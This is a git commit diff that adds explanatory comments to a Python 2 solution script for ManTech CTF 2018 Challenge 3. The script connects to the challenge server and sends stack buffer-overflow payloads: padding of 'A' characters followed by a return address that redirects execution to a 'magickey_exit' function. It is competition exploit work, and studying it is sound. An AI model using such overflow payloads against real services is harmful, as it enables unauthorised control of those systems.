35d54728150ac77b70905f4f49f343affd596fec
Saccharide <rtang@email.wm.edu>
2018-03-26 09:05:27 -0700

    Added some explanation to challenge 3

--- challenge3/newpy.py
+++ challenge3/newpy.py
@@ -1,6 +1,16 @@
+##################################################################################################
+'''
+// @Project      ManTech CTF 2018 Challenge 3
+// @Author       Saccharide
+'''
+##################################################################################################
+
+
 import socket
 import os
 import sys
+
+# Xoring ubuntu with fortune message
 pad = "ubuntu"
 def ttt(s):
         ret = []
@@ -9,11 +19,12 @@ def ttt(s):
                 ret.append(chr(tmp))
         return "".join(ret)
 
+# parsing the fortune message
 def getFortune(fortune):
-	
 	return fortune.split("*Here's your fortune!*")[1].split("\n\nGive me your edits.\n")[0].split("\n\n")[1]
 
 
+# Main program
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("hackcoes.com",31337))
 
@@ -44,6 +55,8 @@ new_password = "A"*155#+"\x82\x91\x04\x08"
 s.send(bytearray(new_password))
 
 print s.recv(1024)
+
+# redireting the memory location to magickey_exit
 password = "A"*20+ "\x82\x91\x04\x08" #"\x73\x8B\x04\x08"
 
 s.send(bytearray(password))
@@ -54,6 +67,5 @@ print s.recv(1024)
 
 print s.recv(1024)
 print s.recv(1024)
-
 
 
